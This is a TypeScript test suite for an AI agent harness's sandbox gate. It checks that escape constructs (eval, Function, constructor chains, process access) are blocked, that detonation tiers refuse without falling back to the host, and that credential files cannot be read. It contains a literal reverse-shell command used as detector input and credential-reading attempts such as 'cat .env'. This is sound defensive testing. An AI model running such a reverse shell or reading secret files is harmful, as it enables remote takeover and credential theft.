// Detonation-lane gate tests: the run_js clean-path static gate, the hardened
// sandbox (codeGeneration off), and the refusal behaviour of the detonation
// tiers. Run: npm run detonate:test
//
// NOTE: samples are [label, code] tuples, NOT an object literal. Under tsx a
// quoted "__proto__" key is silently turned into a prototype setter, so an
// object map loses that entry and the test reports a false gate miss.

import path from "node:path";
import fs from "node:fs";
import { runTool } from "../src/server/tools";
import { scanUncleanScript, isUnclean } from "../src/server/detonate";

let failures = 0;
function check(name: string, cond: boolean, detail = ""): void {
  if (cond) console.log(`  PASS ${name}`);
  else { failures++; console.log(`  FAIL ${name}${detail ? ` - ${detail}` : ""}`); }
}

// Each sample trips exactly one gate rule and none of the others.
const SAMPLES: Array<[string, string]> = [
  ["require()", `const r = require("fs");`],
  ["dynamic import", `const m = await import("fs");`],
  ["process access", `const p = process.env;`],
  ["globalThis", `const g = globalThis;`],
  ["dynamic Function", `const f = Function("return 1");`],
  ["eval", `const v = eval("1+1");`],
  ["constructor chain", `const c = [].constructor.constructor;`],
  ["__proto__ access", `const o = {}; o.__proto__;`],
  ["network fetch", `await fetch("http://x");`],
  ["WebAssembly", `const w = WebAssembly;`],
  ["node: builtin", `const n = "node:fs";`],
];

async function main(): Promise<void> {
  const worktree = process.cwd();
  console.log("[ehc] detonate gate tests");

  // 1. static gate catches every escape / host / network vector
  for (const [label, code] of SAMPLES) {
    const hits = scanUncleanScript(code);
    check(`gate catches ${label}`, hits.length > 0, JSON.stringify(hits));
  }
  // ...and the gate only fires for the intended construct (no rule swallows all)
  const overreach = SAMPLES.filter(([, code]) => scanUncleanScript(code).length > 1);
  check("no single rule swallows every sample", overreach.length < SAMPLES.length, `${overreach.length} samples tripped multiple rules`);

  // 2. benign analysis scripts pass the gate
  check("gate passes benign script", scanUncleanScript(`const f = await glob('**/*.ts'); return f.length;`).length === 0);
  // A grep for the literal word "process" must not trip the process-access rule.
  check("grep for 'process' is not flagged", scanUncleanScript(`await grep({pattern: 'process'})`).length === 0);

  // 3. clean path runs benign scripts
  const ok = await runTool("run_js", { approved: true, code: `const a = await ls({}); return 'entries:' + a.length;` }, worktree);
  check("benign script executes", ok.ok === true, ok.error ?? "");

  // 4. a gate-violating script is refused with guidance, never executed
  const bad = await runTool("run_js", { approved: true, code: `const p = process.env; return p;` }, worktree);
  check("violation refused", bad.ok === false && /clean-path gate/.test(bad.error ?? ""), bad.error ?? "");
  check("refusal names the construct", /process access/.test(bad.error ?? ""));

  // 5. this-escape stays contained inside the sandbox
  const escape = await runTool("run_js", { approved: true, code: `return this.process ? 'escaped' : 'contained';` }, worktree);
  check("this-escape contained", escape.ok === false || !/escaped/.test(escape.out ?? ""), escape.out ?? "");

  // 6. detonation tiers state their refusal plainly. Here the lane is enabled in
  // config but sbx is not installed: the required property is that we NEVER
  // silently fall back to running on the host.
  const detEnabled = detonateEnabledIn(worktree);
  const exec = await runTool("run_js", { approved: true, code: `return 1;`, tier: "execute" }, worktree);
  const execMsg = (exec.error ?? "") + (exec.out ?? "");
  const execRefused = exec.ok === false && (detEnabled ? /sbx/i.test(execMsg) : /disabled/i.test(execMsg));
  check("execute tier refuses plainly (no host fallback)", execRefused, execMsg.slice(0, 120));
  const rt = await runTool("run_js", { approved: true, code: `return 1;`, tier: "redteam" }, worktree);
  const rtMsg = (rt.error ?? "") + (rt.out ?? "");
  const rtRefused = rt.ok === false && (detEnabled ? /sbx/i.test(rtMsg) : /disabled/i.test(rtMsg));
  check("redteam tier refuses plainly (no host fallback)", rtRefused, rtMsg.slice(0, 120));

  // 7. unclean-text heuristic still routes payloads away from the clean path
  check("isUnclean detects reverse shell", isUnclean("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1") === true);
  check("isUnclean passes normal text", isUnclean("refactor the parser module") === false);

  // 8. credential files are never agent-readable or agent-writable
  const readSecrets = await runTool("read", { approved: true, path: ".harness/secrets.json" }, worktree);
  check("read of secrets.json refused", readSecrets.ok === false && /credential/i.test(readSecrets.error ?? ""), readSecrets.error ?? "");
  const writeEnv = await runTool("write", { approved: true, path: ".env", content: "KEY=x" }, worktree);
  check("write of .env refused", writeEnv.ok === false && /credential/i.test(writeEnv.error ?? ""), writeEnv.error ?? "");
  const catEnv = await runTool("bash", { approved: true, cmd: "cat .env" }, worktree);
  check("bash cat .env refused", catEnv.ok === false && /credential/i.test(catEnv.error ?? ""), catEnv.error ?? "");
  const envExample = await runTool("read", { approved: true, path: ".env.example" }, worktree);
  check(".env.example stays readable (template, not secret)", envExample.ok === true || !/credential/i.test(envExample.error ?? ""), envExample.error ?? "(missing file is fine)");

  console.log(failures === 0 ? "[ehc] detonate gate tests: ALL PASS" : `[ehc] detonate gate tests: ${failures} FAILURE(S)`);
  process.exit(failures === 0 ? 0 : 1);
}

function detonateEnabledIn(worktree: string): boolean {
  try {
    const raw = JSON.parse(fs.readFileSync(path.join(worktree, ".harness", "config.json"), "utf8")) as { detonate?: { enabled?: boolean } };
    return raw.detonate?.enabled === true;
  } catch { return false; }
}

main().catch((e) => { console.error("[ehc] detonate tests crashed:", e); process.exit(1); });
